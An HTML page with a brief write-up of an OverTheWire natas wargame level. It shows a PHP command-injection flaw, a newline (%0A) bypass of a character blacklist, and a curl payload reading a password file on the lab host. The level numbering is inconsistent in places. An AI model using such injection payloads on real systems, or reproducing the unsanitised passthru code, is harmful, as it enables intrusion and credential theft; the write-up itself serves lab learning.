<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>natas9 writeup</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body{ font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; max-width:800px; margin:40px auto; line-height:1.6; padding:0 16px;}
    pre{ background:#0b0b0b; color:#e6e6e6; padding:12px; border-radius:6px; overflow:auto;}
    h1{ font-weight:700; }
  </style>
</head>
<body>
  <h1>natas9 — Command Injection</h1>
  <p>Snatas9 — Command Injection (Short Write-up)

Summary
A simple command-injection vuln: user input is passed into passthru("grep -i $key dictionary.txt"). The developer blacklisted ; | & but missed newline injection — %0A (URL-encoded \n) can separate commands and bypass that blacklist.

Vulnerable snippet
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}

Why %0A works

%0A = LF (line feed). Injecting it creates a new shell line, e.g.:

grep -i <input> dictionary.txt
cat /etc/natas_webpass/natas11


This executes cat even though ; and | were blocked.

Quick payloads (URL-encoded)

Replace PASSWORD9 with your password.

# print natas11 password
<pre>curl -s -u natas10:PASSWORD "http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20%2Fetc%2Fnatas_webpass%2Fnatas11%0A&submit=Search"</pre>
.</p>

</body>
</html>
